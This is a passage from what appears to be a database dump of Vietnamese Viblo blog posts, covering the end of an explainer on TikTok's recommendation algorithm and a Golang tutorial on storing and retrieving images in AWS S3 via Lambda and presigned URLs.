> ***Chúng tôi chế tạo ra những cỗ máy thông minh có khả năng hiểu và phân tích văn bản, hình ảnh và video  bằng cách sử dụng NLP, công nghệ computer vision và metadata - [Bytedance](https://en.wikipedia.org/wiki/ByteDance)***


**TikTok** sử dụng **[computer vision](https://vi.wikipedia.org/wiki/Th%E1%BB%8B_gi%C3%A1c_m%C3%A1y_t%C3%ADnh)** để phân tích các **đặc điểm khuôn mặt**, **sản phẩm** và các đặc điểm khác ở **người** và **đồ vật** để nhanh chóng hiểu nội dung của video.

**[Natural Language Processing](https://vi.wikipedia.org/wiki/X%E1%BB%AD_l%C3%BD_ng%C3%B4n_ng%E1%BB%AF_t%E1%BB%B1_nhi%C3%AAn)** sau đó được sử dụng để **dịch** và mô tả nội dung **âm thanh của video**. NLP trích xuất thông tin âm thanh từ video và áp dụng mức độ phân tích đối với video đó.

Bước cuối cùng trong việc **phân loại video** TikTok là **[metadata](https://vi.wikipedia.org/wiki/Si%C3%AAu_d%E1%BB%AF_li%E1%BB%87u)** mà người dùng cung cấp khi đăng: **caption**, **hashtag** #, v.v

Chính vì vậy ngoài việc tạo ra nội dung hay, thì **việc bố trí các đồ vật xuất hiện** trong video cũng rất quan trọng để TikTok có thể hiểu nội dung trên kênh của bạn và phân phát đến tệp người dùng hợp lý hơn. Ví dụ làm nội dung về giáo dục thì để hình ảnh sách, bút, trường lớp xuất hiện trên video. Làm
nội dung về lập trình thì để các đồ vật như máy tính, laptop, màn hình code ...
![](https://images.viblo.asia/b82e810e-c150-4468-a41c-d8007071aa71.png)

# 3. Recommendation system

Khi bạn mở **Tiktok**, bạn sẽ thấy một số video khác nhau về các chủ đề khác nhau. Dựa trên cách bạn **tương tác** với từng video (**xem lại, thích, chia sẻ, bỏ qua**), một video mới sẽ được sắp xếp.

Dựa trên mức độ **tương tác ban đầu**, thuật toán của Tiktok sau đó có thể áp dụng **tính năng lọc** dựa trên **nội dung** để hiển thị thêm cho người dùng các video có liên quan. Tính năng lọc dựa trên **nội dung tìm kiếm** những điểm **tương đồng** giữa **video mới** và **video mà người dùng đã tương tác**. Sau đó, thuật toán sẽ cung cấp nội dung mới cho người dùng dựa trên nội dung mà họ đã tương tác trước đó.

**Với người dùng**

Sau khi tạo đủ dữ liệu về người dùng, video sẽ được cung cấp cho bạn ở tab **Dành cho bạn**. Ví dụ, người dùng **A** tương tác với video **1, 2, 3, 4, 5** và người dùng **B** tương tác với **2, 3, 4, 5 và 6**, thuật toán của TikTok có thể sẽ phát hiện **những điểm tương đồng giữa hai người dùng** và phân phát video **1** cho người dùng **B** và video **6** cho người dùng **A**.

**Với video**

Sau khi có các **thông tin** về video từ quá trình **phân tích**. **TikTok** sẽ **phân phát** video này cho **một số lượng nhỏ** người dùng phù hợp dựa trên đánh giá và phân loại. Ví dụ hệ thống tính toán điểm như sau(Lưu ý con số chỉ là ước lượng):
* ***Xem lại video: 10 điểm***
* ***Xem hết video: 8 điểm***
* ***Chia sẻ video: 6 điểm***
* ***Bình luận vào video: 4 điểm***
* ***Thích video: 2 điểm***

Nếu video của bạn sau lần **phân phát đầu tiên** đạt đến **một ngưỡng số điểm** nhất định được coi là **thành công**. Qu**á trình phân phát** tới một lượng người dùng phù hợp khác sẽ **lặp lại**. Cứ như vậy video của bạn ngày càng có khả năng tiếp cận với nhiều người dùng cho đến khi phân phát đến tập khách hàng không phù hợp. Lúc này quá trình phân phát video sẽ dừng lại.
![](https://images.viblo.asia/1c0bdf84-00ef-46f9-a3de-4fd87b11256d.png)

# 4. Bài học
Với bất kể một nền tảng nào đó, khi đã hiểu về cách thức hoạt động, bạn có thể dễ dàng tìm ra những **chiến lược** phù hợp cho mình. Qua bài viết mình đã giới thiệu cho các bạn cách mà TikTok đang **đánh giá một video** cũng như cách mà TikTok **phân phát video** đến bạn như thế nào. Hi vọng nếu ai đó đang có ý định làm nội dung trên TikTok có thể lưu ý những điều này để có nhiều video thành công hơn thông qua các chiến lược quan trọng
- **Cố gắng giữ chân người dùng xem video của mình càng lâu càng tốt hoặc xem lại nhiều lần.**
- **Ngoài nội dung của video hay, hãy chú ý tới cả caption, hashtag của bài viết.**
- **Hình ảnh trong video cũng rất quan trọng, nếu làm video về lĩnh vực nào. Hãy để những đồ vật trong lĩnh vực đó xuất hiện trong video của bạn một cách thường xuyên nhất có thể.**

Ngoài ra mình đang viết bài với tư cách một **[content creator](https://partner.viblo.asia/vi/partnership-services/content-creator-wMvbmOeYAl)** của Viblo nên rất mong các bạn **upvote** cũng như **share bài viết** nếu thấy hữu ích để mình có thêm động lực tạo ra nhiều nội dung hay hơn.

**Đọc những bài viết khác của tác giả**: **[Chillwithsu.com](https://chillwithsu.com/)**

**Donate cho tác giả** : **[Buy me a coffee](https://www.buymeacoffee.com/su.lowkey)**

**Chúc các bạn code vui, khỏe, giải trí !!!**

**Tham khảo:**
* ***[How TikTok recommends videos #ForYou](https://newsroom.tiktok.com/en-us/how-tiktok-recommends-videos-for-you)***
* ***[Reverse engineering how TikTok algorithm works](https://www.veed.io/learn/reverse-engineering-how-tiktok-algorithm-works?fbclid=IwAR0-31LWCge_Xg2rKYpTs4GiHKSOZwLV6KIudYuidXlQJv46xPP0qBxwywA)***', '2023-02-05T02:48:56.000000Z', '2023-02-28T05:00:16.000000Z', '2023-02-05T02:47:24.000000Z'),
	('[Golang] Dùng Lambda Để Lưu và Lấy Image Từ AWS S3', 'vlZL99nBLQK', '7', 'public', 'https://images.viblo.asia/eb0b85e8-d0db-42f8-bdd0-f4365bd5c6cb.png', 'Mục Tiêu
* Lưu ảnh lên  Amazon Simple Storage Service
* Lấy ảnh từ  Amazon Simple Storage Service, giới hạn TTL

Chuẩn Bị
* Bạn có đọc thêm series để nắm căn bản: https://viblo.asia/s/golang-lambda-serverless-vElaB8eD5kw

API Lưu Image
* Image được input dưới dạng base64

Cấu Hình ENV
Trong file serverless.yaml, add 2 env
* Sau khi deploy thành công, thì truy cập aws-console search S3 service đ...', '## Mục Tiêu
* Lưu ảnh lên  Amazon Simple Storage Service
* Lấy ảnh từ  Amazon Simple Storage Service, giới hạn TTL

## Chuẩn Bị
* Bạn có đọc thêm series để nắm căn bản: https://viblo.asia/s/golang-lambda-serverless-vElaB8eD5kw

## API Lưu Image
* Image được input dưới dạng base64

### Cấu Hình ENV
**Trong file serverless.yaml, add 2 env**
```
provider:
  environment:
    S3_BUCKET: "images-dev-serverlessdeploymentbucket-1g3trol0zorpp"
    IMAGE_BLOG: "image-blog/"
```
* Sau khi deploy thành công, thì truy cập *aws-console* search S3 service để check bucket của project => copy và bỏ vào env
* Env `IMAGE_BLOG` là image sẽ được lưu sub-folder trong bucket

### List function Code
**Tạo AWS session**
```
func CreateSession(req AwsReq) *session.Session {
	sess := session.Must(session.NewSessionWithOptions(session.Options{
		SharedConfigState: session.SharedConfigEnable,
	}))
	return sess
}
```
* Để có thể tạo được *session*, yêu cầu cấu hình *credential* trước.
Checkout [Cấu Hình AWS Credential](https://viblo.asia/p/cau-hinh-aws-credential-zOQJwYPxVMP) để cấu hình *credential*

**Func kiểm tra size của image**
```
// fn upload image to s3, request iamge is base64
func CheckSizeBase64(baseImage *string) error {
	sizeByte := base64.StdEncoding.DecodedLen(len(*baseImage))
	sizeRe := 5000000
	if sizeByte > sizeRe {
		err := fmt.Errorf("size image large, require size %d and size input %d", sizeRe, sizeByte)
		return err
	}
	return nil
}
```
* Image từ client dưới dạng base64 => check size bằng cách kiểm tra số lượng kí tự của base64
* Func check số lượng kí tự vượt quá 5 triệu thì sẽ báo lỗi

**Func Lưu image đến s3**
```
func StoreS3(ctx context.Context, reqDTO StoreS3Req) (*s3.PutObjectOutput, StoreS3Reponse, error) {
	var (
		dataRes = StoreS3Reponse{}
		err     error
		putOut  = &s3.PutObjectOutput{}
	)
	if reqDTO.BaseImage == nil {
		return putOut, dataRes, fmt.Errorf("base64 of image is require")
	}
	if len(*reqDTO.BaseImage) == 0 {
		return putOut, dataRes, fmt.Errorf("byte image decode empty")
	}
	splitBase := strings.Split(*reqDTO.BaseImage, "base64,")
	var newBase string
	if len(splitBase) > 1 {
		newBase = splitBase[1]
	} else {
		newBase = splitBase[0]
	}
	byteImage, err := base64.StdEncoding.DecodeString(newBase)
	if err != nil {
		fmt.Println("image decode string err", err)
		return putOut, dataRes, err
	}

	mimeType := http.DetectContentType(byteImage)
	fmt.Println("mime type:", mimeType)
	if !strings.Contains(mimeType, "jpeg") && !strings.Contains(mimeType, "png") {
		return putOut, dataRes, fmt.Errorf("mime type error")
	}

	byteReader := bytes.NewReader(byteImage)

	dataRes.PathImage = reqDTO.PathImage
	session := CreateSession(AwsReq{
		CustomEndpoint: reqDTO.CustomEndpoint,
	})
	putOut, err = s3.New(session).PutObject(&s3.PutObjectInput{
		Body:        byteReader,
		Bucket:      aws.String(GetS3Bucket()),
		Key:         aws.String(dataRes.PathImage),
		ContentType: &mimeType,
	})

	return putOut, dataRes, err
}
```
* Line code `mimeType := http.DetectContentType(byteImage)` kiểm tra type của image, chỉ handle 2 dạng type [''png'',''jpeg'']

**Một số func phụ khác:**
* Get bucket name từ environment:
```
func GetS3Bucket() string {
	bucket := os.Getenv("S3_BUCKET")
	if bucket != "" {
		return bucket
	}
	log.Default().Println("GetS3Bucket default value:", "pkg.BucketDefault")
	return "pkg.BucketDefault"
}
```
=> lấy *bucket-name* thừ environment, nếu env rỗng thì sử dụng *bucket-name* mặc định.
### Test API
* Request data:
```
{
    "requestId":"",
    "requestTime":"",
    "data": {
        "file_name": "ducnp",
        "name":"ducnp5-test1",
        "phone":"0335288888",
        "partner_id":"myst",
        "user_id":"ducnp",
        "image":"****am6firEVHTsD//2Q==****"
    }
}
```
* Response data:![](https://images.viblo.asia/eb0b85e8-d0db-42f8-bdd0-f4365bd5c6cb.png). Truy cập S3 thì sẽ thấy ảnh đã lưu thành công.

**ERROR**
* Có thể xuất hiện lỗi này:
![](https://images.viblo.asia/86f8772e-b01e-4e89-a9ba-586b4877a363.png)
==> truy cập vào *cloud-watch*, để check error. Thường là do chưa cấp quyền cho Role access vào S3.


## API Get Image
* Tương tự như lưu ảnh, API get image thì chỉ khác 1 chỗ đó là hàm `PresignUrl`

### List function Code
**PresignUrl**
```
func PresignUrl(reqAws AwsReq, presign PresignUrlReq) (string, error) {
	var (
		url string
		err error
	)
	clientS3 := CreateS3Client(reqAws)
	req, _ := clientS3.GetObjectRequest(&s3.GetObjectInput{
		Bucket: aws.String(presign.Bucket),
		Key:    aws.String(presign.KeyPath),
	})
	url, err = req.Presign(presign.UrlTtl)
	if err != nil {
		return url, fmt.Errorf("presign url err %s", err)
	}
	return url, err
}
```
* Trong func có thuộc tính `TTL` là giới hạn thời gian access đến image.
### Test API
* Request:
```
{
    "requestId":"",
    "requestTime":"",
    "data": {
        "pathImage": "image-blog/0335288888landucnp5-test1"
    }
}
```
* Response:
```
{
    "data": {
        "url": "https://images-dev-serverle****blog/0335288888landucnp5-test1?X-Amz-***mz-Credential=ASIAQ52H7T***"
    },
    "responseCode": "00",
    "responseId": "8b2f9168-4ad4-4f6c-b0b6-8b78f3d7c99d",
    "responseMessage": "successfully",
    "responseTime": "2023-02-05T01:28:17Z"
}
```
==> copy *url* và mở bằng browser để xem.
* Image hết hạn: ![](https://images.viblo.asia/cbbc121d-e7cf-4871-9e2a-ec8dcdaa661d.png)

**Contact**
* facebook: https://www.facebook.com/phucducdev/
* gmail: ducnp09081998@gmail.com or phucducktpm@gmail.com
* linkedin: https://www.linkedin.com/in/phucducktpm/
* hashnode: https://hashnode.com/@OpenDev
* telegram: https://t.me/OpenDevGolang', '2023-02-05T01:42:27.000000Z', '2023-02-26T07:42:03.000000Z', '2023-02-05T02:12:55.000000Z');
